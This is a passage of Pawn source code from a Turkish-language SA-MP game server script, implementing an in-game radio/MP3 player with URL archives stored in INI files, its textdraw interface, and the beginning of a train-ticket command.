						if(MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Exist] == 0) return 1;
						if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
						{
						format(Yazi, 300, "{FFCC00}» {FFFFFF}ADMIN %s, \"%s\" {F8F8FF}þarkýsýný açtý.", GetName(playerid), MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Name]);
						SendClientMessageToAll(-1, Yazi);
						}
						else
	  					{
	  					format(Yazi, 300, "{FFCC00}» {FFFFFF}DJ %s, \"%s\" {F8F8FF}þarkýsýný açtý.", GetName(playerid), MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Name]);
						SendClientMessageToAll(-1, Yazi);
						}

						SendClientMessageToAll(-1, "{F8F8FF}Þarkýyý dinlemek istemiyorsanýz {ADFF2F}/skapat {F8F8FF}yazabilirsiniz.");

                        CalanMP3ID = MPItem[playerid][ MPSItem[playerid] ];
						format(CalanMP3Name, 100, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Name]);
						format(CalanMP3URL, 300, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3URL]);
						foreach(new i:Player)
						{
					    	if(MPMode[i] == 1)
					    	{
					    		PlayAudioStreamForPlayer(i, MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3URL]);
							}
						}
					}
	            }

	            case 2: // MP3'ü Sil
	            {
            		if(APlayerData[playerid][PlayerLevel] == 4 && APlayerData[playerid][PlayerDjLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FF0000}Bunu sadece 4 LEVEL üstü adminler ve 2 LEVEL Dj ler yapabilir !");
					new Yazi[300];
					if(MPde[playerid] == 2) // Radyo
	                {
	                	if(Radler[ MPItem[playerid][ MPSItem[playerid] ] ][RadExist] == 0) return 1;
	                	RadSil(MPItem[playerid][ MPSItem[playerid] ]);
						SendClientMessage(playerid, -1, "{00FF00}Seçtiðiniz Radyo Ýstasyonu arþivden silindi.");

						for(new i; i < 10; i++)
						{
		    				PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
							MPItem[playerid][i] = -1;
						}

  						new Count, RCount;

						foreach(new i:Rads)
						{
							if(Count < MPSayfa[playerid] * 10)
							{
   								Count++;
							}else{
   								RCount++;

								if(RCount <= 10)
								{
				    				MPItem[playerid][RCount-1] = i;
				    				format(Yazi, 300, "~r~%d# ~w~%s", i, Radler[i][RadName]);
									PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
								}
							}
						}
    				}else if(MPde[playerid] == 3) // Müzik
      				{
       					if(MP3ler[ MPItem[playerid][ MPSItem[playerid] ] ][MP3Exist] == 0) return 1;
         				MP3Sil(MPItem[playerid][ MPSItem[playerid] ]);
						SendClientMessage(playerid, -1, "{00FF00}Seçtiðiniz MP3 arþivden silindi.");

						for(new i; i < 10; i++)
						{
		    				PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
							MPItem[playerid][i] = -1;
						}

  						new Count, RCount;

						foreach(new i:MP3s)
						{
							if(Count < MPSayfa[playerid] * 10)
							{
   								Count++;
							}else{
   								RCount++;

								if(RCount <= 10)
								{
				    				MPItem[playerid][RCount-1] = i;
				    				format(Yazi, 300, "~r~%d# ~w~%s", i, MP3ler[i][MP3Name]);
									PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
								}
							}
						}
					}
   				}
  			}
	    }
	}

	if(dialogid == DialogNewMP3Name)
	{
	    if(response)
	    {
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewMP3Name, DIALOG_STYLE_INPUT, "{00FF00}MP3 Ekle - MP3 Adý", "{F8F8FF}Ekleyeceðiniz MP3'ün adýný giriniz:", "Devam", "Ýptal");
			format(SelectedMP3Name[playerid], 80, inputtext);
			ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{00FF00}MP3 Ekle - MP3 URL", "{F8F8FF}Ekleyeceðiniz MP3'ün URL'sini giriniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogNewMP3URL)
	{
	    if(response)
	    {
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{00FF00}MP3 Ekle - MP3 URL", "{F8F8FF}Ekleyeceðiniz MP3'ün URL'sini giriniz:", "Devam", "Ýptal");
			format(SelectedMP3URL[playerid], 256, inputtext);

			StopAudioStreamForPlayer(playerid);
			PlayAudioStreamForPlayer(playerid, inputtext);

			ShowPlayerDialog(playerid, DialogNewMP3Test, DIALOG_STYLE_MSGBOX, "{00FF00}MP3 Ekle - MP3 Test", "{F8F8FF}Linkin çalýþýp çalýþmadýðýný kontrol edin. Çalýþmýyorsa geri tuþuna basýn.", "Ekle", "Geri");
	    }
	}

	if(dialogid == DialogNewMP3Test)
	{
	    if(response)
	    {
			StopAudioStreamForPlayer(playerid);
			MP3Ekle(SelectedMP3Name[playerid], SelectedMP3URL[playerid]);

			SendClientMessage(playerid, -1, "{00FF00}Arþive yeni MP3 eklediniz.");

			new Yazi[300];

			for(new i; i < 10; i++)
			{
				PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
				MPItem[playerid][i] = -1;
			}

			new Count, RCount;

			foreach(new i:MP3s)
			{
				if(Count < MPSayfa[playerid] * 10)
				{
					Count++;
				}else{
					RCount++;

					if(RCount <= 10)
					{
 						MPItem[playerid][RCount-1] = i;
   						format(Yazi, 300, "~r~%d# ~w~%s", i, MP3ler[i][MP3Name]);
						PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
					}
				}
			}
	    }else{
	        StopAudioStreamForPlayer(playerid);
	        ShowPlayerDialog(playerid, DialogNewMP3URL, DIALOG_STYLE_INPUT, "{00FF00}MP3 Ekle - MP3 URL", "{F8F8FF}Ekleyeceðiniz MP3'ün URL'sini giriniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogNewRadName)
	{
	    if(response)
	    {
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewRadName, DIALOG_STYLE_INPUT, "{00FF00}Radyo Ekle - Radyo Adý", "{F8F8FF}Ekleyeceðiniz Radyo'nun adýný giriniz:", "Devam", "Ýptal");
			format(SelectedRadName[playerid], 80, inputtext);
			ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{00FF00}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz Radyo'nun URL'sini giriniz:", "Devam", "Ýptal");
	    }
	}

	if(dialogid == DialogNewRadURL)
	{
	    if(response)
	    {
			if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{00FF00}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz Radyo'nun URL'sini giriniz:", "Devam", "Ýptal");
			format(SelectedRadURL[playerid], 256, inputtext);

			StopAudioStreamForPlayer(playerid);
			PlayAudioStreamForPlayer(playerid, inputtext);

			ShowPlayerDialog(playerid, DialogNewRadTest, DIALOG_STYLE_MSGBOX, "{00FF00}Radyo Ekle - Radyo Test", "{F8F8FF}Linkin çalýþýp çalýþmadýðýný kontrol edin. Çalýþmýyorsa geri tuþuna basýn.", "Ekle", "Geri");
	    }
	}

	if(dialogid == DialogNewRadTest)
	{
	    if(response)
	    {
			StopAudioStreamForPlayer(playerid);
			RadEkle(SelectedRadName[playerid], SelectedRadURL[playerid]);

			SendClientMessage(playerid, -1, "{00FF00}Arþive yeni radyo eklediniz.");

			new Yazi[300];

			for(new i; i < 10; i++)
			{
				PlayerTextDrawSetString(playerid, UI_MPItem[playerid][i], " ");
				MPItem[playerid][i] = -1;
			}

			new Count, RCount;

			foreach(new i:Rads)
			{
				if(Count < MPSayfa[playerid] * 10)
				{
					Count++;
				}else{
					RCount++;

					if(RCount <= 10)
					{
 						MPItem[playerid][RCount-1] = i;
   						format(Yazi, 300, "~r~%d# ~w~%s", i, Radler[i][RadName]);
						PlayerTextDrawSetString(playerid, UI_MPItem[playerid][RCount-1], Yazi);
					}
				}
			}
	    }else{
	        StopAudioStreamForPlayer(playerid);
	        ShowPlayerDialog(playerid, DialogNewRadURL, DIALOG_STYLE_INPUT, "{00FF00}Radyo Ekle - Radyo URL", "{F8F8FF}Ekleyeceðiniz Radyo'nun URL'sini giriniz:", "Devam", "Ýptal");
	    }
	}
	return 1;
}

MP3Ekle(name[], url[])
{
	new CreatedID;
	CreatedID = Iter_Free(MP3s);
	Iter_Add(MP3s, CreatedID);
	MP3ler[CreatedID][MP3Exist] = 1;

	format(MP3ler[CreatedID][MP3Name], 80, name);
	format(MP3ler[CreatedID][MP3URL], 256, url);

	new FileName[80], INI:File;
	format(FileName, 80, MP3File, CreatedID);
	File = INI_Open(FileName);

	INI_SetTag(File, "mzk");

	INI_WriteString(File, "Name", MP3ler[CreatedID][MP3Name]);
	INI_WriteString(File, "URL", MP3ler[CreatedID][MP3URL]);

	INI_Close(File);

	return CreatedID;
}

MP3Sil(MP3ID)
{
	Iter_Remove(MP3s, MP3ID);
	MP3ler[MP3ID][MP3Exist] = 0;

	format(MP3ler[MP3ID][MP3Name], 80, "-");
	format(MP3ler[MP3ID][MP3URL], 256, "-");

	new FileName[80];
	format(FileName, 80, MP3File, MP3ID);

	if(fexist(FileName)) fremove(FileName);
}

MP3Yukle()
{
	new FileName[80], Loadedcount;

	for(new i; i < 2000; i++)
	{
	    format(FileName, 80, MP3File, i);

	    if(fexist(FileName))
	    {
	        INI_ParseFile(FileName, "MP3TekYukle_%s", .bExtra = true, .extra = i);

			MP3ler[i][MP3Exist] = 1;
	        Iter_Add(MP3s, i);
		    Loadedcount++;
	    }
 	}

 	printf("%d MP3 yuklendi", Loadedcount);
}

forward MP3TekYukle_mzk(MP3ID, name[], value[]);
public MP3TekYukle_mzk(MP3ID, name[], value[])
{
	INI_String("Name", MP3ler[MP3ID][MP3Name], 80);
	INI_String("URL", MP3ler[MP3ID][MP3URL], 256);
	return 1;
}

RadEkle(name[], url[])
{
	new CreatedID;
	CreatedID = Iter_Free(Rads);
	Iter_Add(Rads, CreatedID);
	Radler[CreatedID][RadExist] = 1;

	format(Radler[CreatedID][RadName], 80, name);
	format(Radler[CreatedID][RadURL], 256, url);

	new FileName[80], INI:File;
	format(FileName, 80, RadFile, CreatedID);
	File = INI_Open(FileName);

	INI_SetTag(File, "rad");

	INI_WriteString(File, "Name", Radler[CreatedID][RadName]);
	INI_WriteString(File, "URL", Radler[CreatedID][RadURL]);

	INI_Close(File);

	return CreatedID;
}

RadSil(RadID)
{
	Iter_Remove(Rads, RadID);
	Radler[RadID][RadExist] = 0;

	format(Radler[RadID][RadName], 80, "-");
	format(Radler[RadID][RadURL], 256, "-");

	new FileName[80];
	format(FileName, 80, RadFile, RadID);

	if(fexist(FileName)) fremove(FileName);
}

RadYukle()
{
	new FileName[80], Loadedcount;

	for(new i; i < 300; i++)
	{
	    format(FileName, 80, RadFile, i);

	    if(fexist(FileName))
	    {
	        INI_ParseFile(FileName, "RadTekYukle_%s", .bExtra = true, .extra = i);

			Radler[i][RadExist] = 1;
	        Iter_Add(Rads, i);
		    Loadedcount++;
	    }
 	}

 	printf("%d Radyo Istasyonu yuklendi", Loadedcount);
}

forward RadTekYukle_rad(RadID, name[], value[]);
public RadTekYukle_rad(RadID, name[], value[])
{
	INI_String("Name", Radler[RadID][RadName], 80);
	INI_String("URL", Radler[RadID][RadURL], 256);
	return 1;
}

LoadMPUI(playerid)
{
UI_MPHeadBox[playerid] = CreatePlayerTextDraw(playerid, 139.000000, 114.000000, "_");
PlayerTextDrawBackgroundColor(playerid, UI_MPHeadBox[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPHeadBox[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPHeadBox[playerid], 0.500000, 1.100000);
PlayerTextDrawColor(playerid, UI_MPHeadBox[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPHeadBox[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPHeadBox[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPHeadBox[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPHeadBox[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPHeadBox[playerid], -1375784961);
PlayerTextDrawTextSize(playerid, UI_MPHeadBox[playerid], 492.000000, 0.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPHeadBox[playerid], 0);

UI_MPMainBox[playerid] = CreatePlayerTextDraw(playerid, 139.000000, 128.000000, "_");
PlayerTextDrawBackgroundColor(playerid, UI_MPMainBox[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPMainBox[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPMainBox[playerid], 0.500000, 20.499992);
PlayerTextDrawColor(playerid, UI_MPMainBox[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPMainBox[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPMainBox[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPMainBox[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPMainBox[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPMainBox[playerid], 170);
PlayerTextDrawTextSize(playerid, UI_MPMainBox[playerid], 492.000000, 0.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPMainBox[playerid], 0);

UI_MPHeadBaslik[playerid] = CreatePlayerTextDraw(playerid, 141.000000, 113.000000, "~l~Radyo/Muzik Calar");
PlayerTextDrawBackgroundColor(playerid, UI_MPHeadBaslik[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPHeadBaslik[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPHeadBaslik[playerid], 0.289999, 1.100000);
PlayerTextDrawColor(playerid, UI_MPHeadBaslik[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPHeadBaslik[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPHeadBaslik[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPHeadBaslik[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPHeadBaslik[playerid], 0);

UI_MPRadyoLogo[playerid] = CreatePlayerTextDraw(playerid, 276.000000, 139.000000, "hud:radar_ryder");
PlayerTextDrawBackgroundColor(playerid, UI_MPRadyoLogo[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPRadyoLogo[playerid], 4);
PlayerTextDrawLetterSize(playerid, UI_MPRadyoLogo[playerid], 0.650000, 2.700000);
PlayerTextDrawColor(playerid, UI_MPRadyoLogo[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPRadyoLogo[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPRadyoLogo[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPRadyoLogo[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPRadyoLogo[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPRadyoLogo[playerid], 255);
PlayerTextDrawTextSize(playerid, UI_MPRadyoLogo[playerid], 19.000000, 15.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPRadyoLogo[playerid], 1);

UI_MPRadyoYazi[playerid] = CreatePlayerTextDraw(playerid, 267.000000, 155.000000, "Radyo");
PlayerTextDrawBackgroundColor(playerid, UI_MPRadyoYazi[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPRadyoYazi[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPRadyoYazi[playerid], 0.380000, 1.200000);
PlayerTextDrawColor(playerid, UI_MPRadyoYazi[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPRadyoYazi[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPRadyoYazi[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPRadyoYazi[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPRadyoYazi[playerid], 0);

UI_MPMuzikLogo[playerid] = CreatePlayerTextDraw(playerid, 329.000000, 139.000000, "hud:radar_datedisco");
PlayerTextDrawBackgroundColor(playerid, UI_MPMuzikLogo[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPMuzikLogo[playerid], 4);
PlayerTextDrawLetterSize(playerid, UI_MPMuzikLogo[playerid], 0.650000, 2.700000);
PlayerTextDrawColor(playerid, UI_MPMuzikLogo[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPMuzikLogo[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPMuzikLogo[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPMuzikLogo[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPMuzikLogo[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPMuzikLogo[playerid], 255);
PlayerTextDrawTextSize(playerid, UI_MPMuzikLogo[playerid], 18.000000, 15.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPMuzikLogo[playerid], 1);

UI_MPMuzikYazi[playerid] = CreatePlayerTextDraw(playerid, 320.000000, 155.000000, "Muzik");
PlayerTextDrawBackgroundColor(playerid, UI_MPMuzikYazi[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPMuzikYazi[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPMuzikYazi[playerid], 0.380000, 1.200000);
PlayerTextDrawColor(playerid, UI_MPMuzikYazi[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPMuzikYazi[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPMuzikYazi[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPMuzikYazi[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPMuzikYazi[playerid], 0);

for(new i; i < 10; i++)
{
	UI_MPItem[playerid][i] = CreatePlayerTextDraw(playerid, 145.000000, 132.0 + (13.0 * i), " ");
	PlayerTextDrawBackgroundColor(playerid, UI_MPItem[playerid][i], 255);
	PlayerTextDrawFont(playerid, UI_MPItem[playerid][i], 1);
	PlayerTextDrawLetterSize(playerid, UI_MPItem[playerid][i], 0.220000, 1.000000);
	PlayerTextDrawColor(playerid, UI_MPItem[playerid][i], -1);
	PlayerTextDrawSetOutline(playerid, UI_MPItem[playerid][i], 0);
	PlayerTextDrawSetProportional(playerid, UI_MPItem[playerid][i], 1);
	PlayerTextDrawSetShadow(playerid, UI_MPItem[playerid][i], 0);
	PlayerTextDrawUseBox(playerid, UI_MPItem[playerid][i], 1);
	PlayerTextDrawBoxColor(playerid, UI_MPItem[playerid][i], 0xFFFFFF00);
	PlayerTextDrawTextSize(playerid, UI_MPItem[playerid][i], 301.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid, UI_MPItem[playerid][i], 1);
}

UI_MPCMBox[playerid] = CreatePlayerTextDraw(playerid, 369.000000, 132.000000, "_");
PlayerTextDrawBackgroundColor(playerid, UI_MPCMBox[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPCMBox[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPCMBox[playerid], 0.220000, 14.899999);
PlayerTextDrawColor(playerid, UI_MPCMBox[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPCMBox[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPCMBox[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPCMBox[playerid], 0);
PlayerTextDrawUseBox(playerid, UI_MPCMBox[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPCMBox[playerid], -421075286);
PlayerTextDrawTextSize(playerid, UI_MPCMBox[playerid], 488.000000, 0.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPCMBox[playerid], 0);

UI_MPCMArtwork[playerid] = CreatePlayerTextDraw(playerid, 372.000000, 134.000000, "loadsc13:loadsc13");
PlayerTextDrawBackgroundColor(playerid, UI_MPCMArtwork[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPCMArtwork[playerid], 4);
PlayerTextDrawLetterSize(playerid, UI_MPCMArtwork[playerid], 0.650000, 2.700000);
PlayerTextDrawColor(playerid, UI_MPCMArtwork[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPCMArtwork[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPCMArtwork[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPCMArtwork[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPCMArtwork[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPCMArtwork[playerid], 255);
PlayerTextDrawTextSize(playerid, UI_MPCMArtwork[playerid], 114.000000, 88.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPCMArtwork[playerid], 0);

UI_MPCMYazi[playerid] = CreatePlayerTextDraw(playerid, 373.000000, 225.000000, "~l~Calan Sarki~n~~b~Ankarali Coskun - Loy Loy~n~~n~~l~Stream~n~~b~Initial Gaming");
PlayerTextDrawBackgroundColor(playerid, UI_MPCMYazi[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPCMYazi[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPCMYazi[playerid], 0.200000, 0.899999);
PlayerTextDrawColor(playerid, UI_MPCMYazi[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPCMYazi[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPCMYazi[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPCMYazi[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPCMYazi[playerid], 0);

UI_MPYMBox[playerid] = CreatePlayerTextDraw(playerid, 369.000000, 274.000000, "_");
PlayerTextDrawBackgroundColor(playerid, UI_MPYMBox[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPYMBox[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPYMBox[playerid], 0.220000, 2.200001);
PlayerTextDrawColor(playerid, UI_MPYMBox[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPYMBox[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPYMBox[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPYMBox[playerid], 0);
PlayerTextDrawUseBox(playerid, UI_MPYMBox[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPYMBox[playerid], -421075286);
PlayerTextDrawTextSize(playerid, UI_MPYMBox[playerid], 488.000000, 0.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPYMBox[playerid], 0);

UI_MPYMLogo[playerid] = CreatePlayerTextDraw(playerid, 375.000000, 277.000000, "hud:radar_hostpital");
PlayerTextDrawBackgroundColor(playerid, UI_MPYMLogo[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPYMLogo[playerid], 4);
PlayerTextDrawLetterSize(playerid, UI_MPYMLogo[playerid], 0.650000, 2.700000);
PlayerTextDrawColor(playerid, UI_MPYMLogo[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPYMLogo[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPYMLogo[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPYMLogo[playerid], 1);
PlayerTextDrawUseBox(playerid, UI_MPYMLogo[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPYMLogo[playerid], 255);
PlayerTextDrawTextSize(playerid, UI_MPYMLogo[playerid], 14.000000, 13.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPYMLogo[playerid], 1);

UI_MPYMYazi[playerid] = CreatePlayerTextDraw(playerid, 395.000000, 277.000000, "~r~Arsive Radyo/Muzik Ekle");
PlayerTextDrawBackgroundColor(playerid, UI_MPYMYazi[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPYMYazi[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPYMYazi[playerid], 0.220000, 1.199999);
PlayerTextDrawColor(playerid, UI_MPYMYazi[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPYMYazi[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPYMYazi[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPYMYazi[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPYMYazi[playerid], 0);

UI_MPSayfa[playerid] = CreatePlayerTextDraw(playerid, 490.000000, 300.000000, "~w~Sayfa ~p~1/20");
PlayerTextDrawAlignment(playerid, UI_MPSayfa[playerid], 3);
PlayerTextDrawBackgroundColor(playerid, UI_MPSayfa[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPSayfa[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPSayfa[playerid], 0.220000, 0.999999);
PlayerTextDrawColor(playerid, UI_MPSayfa[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPSayfa[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPSayfa[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPSayfa[playerid], 0);
PlayerTextDrawSetSelectable(playerid, UI_MPSayfa[playerid], 0);

UI_MPOSayfa[playerid] = CreatePlayerTextDraw(playerid, 142.000000, 300.000000, "~<~");
PlayerTextDrawBackgroundColor(playerid, UI_MPOSayfa[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPOSayfa[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPOSayfa[playerid], 0.220000, 0.999999);
PlayerTextDrawColor(playerid, UI_MPOSayfa[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPOSayfa[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPOSayfa[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPOSayfa[playerid], 0);
PlayerTextDrawUseBox(playerid, UI_MPOSayfa[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPOSayfa[playerid], 0xFFFFFF00);
PlayerTextDrawTextSize(playerid, UI_MPOSayfa[playerid], 152.000000, 10.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPOSayfa[playerid], 1);

UI_MPSSayfa[playerid] = CreatePlayerTextDraw(playerid, 158.000000, 300.000000, "~>~");
PlayerTextDrawBackgroundColor(playerid, UI_MPSSayfa[playerid], 255);
PlayerTextDrawFont(playerid, UI_MPSSayfa[playerid], 1);
PlayerTextDrawLetterSize(playerid, UI_MPSSayfa[playerid], 0.220000, 0.999999);
PlayerTextDrawColor(playerid, UI_MPSSayfa[playerid], -1);
PlayerTextDrawSetOutline(playerid, UI_MPSSayfa[playerid], 0);
PlayerTextDrawSetProportional(playerid, UI_MPSSayfa[playerid], 1);
PlayerTextDrawSetShadow(playerid, UI_MPSSayfa[playerid], 0);
PlayerTextDrawUseBox(playerid, UI_MPSSayfa[playerid], 1);
PlayerTextDrawBoxColor(playerid, UI_MPSSayfa[playerid], 0xFFFFFF00);
PlayerTextDrawTextSize(playerid, UI_MPSSayfa[playerid], 168.000000, 10.000000);
PlayerTextDrawSetSelectable(playerid, UI_MPSSayfa[playerid], 1);
}
*/
// ************************************************************************************************************************************************************
// Tren Sistemi [ Revolution(Fusional'den) ]
// ************************************************************************************************************************************************************
CMD:bilet(playerid, params[])
{
	new Float:cx, Float:cy, Float:cz, cmd[80], idx;
	GetPlayerPos(playerid, cx, cy, cz);

  	cmd = strtok(params, idx);
   	if(!strlen(cmd))
    {
    	SendClientMessage(playerid, -1, "{F8F8FF}====================[{ADFF2F}Tren Seferi{F8F8FF}]===============");
		SendClientMessage(playerid, -1, "{FF0000}/bilet ls-sf        /bilet ls-lv");
		SendClientMessage(playerid, -1, "{FF0000}/bilet lv-ls        /bilet lv-sf");
		SendClientMessage(playerid, -1, "{FF0000}/bilet sf-lv        /bilet sf-ls ");
		SendClientMessage(playerid, -1, "{F8F8FF}=================================================");
 		return 1;
	}
	else if (strcmp("ls-sf", cmd, true, 10) == 0)
 	{
		if(PlayerToPointStripped(3, playerid, 1722.6012,-1939.5197,13.5826,cx,cy,cz ))// LSSF LSLV
		{
			Bilet[playerid] = 1;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.Los Santos - San Fierro Trenine binerek gidebilirsin.");
		}
		else
		{
			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
	else if (strcmp("ls-lv", cmd, true, 10) == 0)
   	{
		if(PlayerToPointStripped(3, playerid, 2281.3557,-1177.9659,25.9580,cx,cy,cz ))// LSSF LSLV
		{
			Bilet[playerid] = 2;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.Los Santos - Las Venturas Trenine binerek gidebilirsin.");
		}
		else
		{
			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
	else if (strcmp("lv-ls", cmd, true, 10) == 0)
	{
		if(PlayerToPointStripped(3, playerid, 2853.7805,1292.9812,11.3906,cx,cy,cz ))//LVLS
		{
 			Bilet[playerid] = 3;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.Las Venturas - Los Santos Trenine binerek gidebilirsin.");
		}
		else
		{
			SendClientMessage(playerid, -1, "{FF0000}Bilet alabilmek için Tren seferleri bilet alma bölgesinde olmalýsýnýz.");
 		}
   	}
	else if (strcmp("lv-sf", cmd, true, 10) == 0)
	{
		if(PlayerToPointStripped(3, playerid, 1437.4191,2620.2400,11.3926,cx,cy,cz ))//LVSF
		{
 			Bilet[playerid] = 4;
			SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bileti aldýn.Las Venturas - San Fierro Trenine binerek gidebilirsin.");
		}
		else
		{
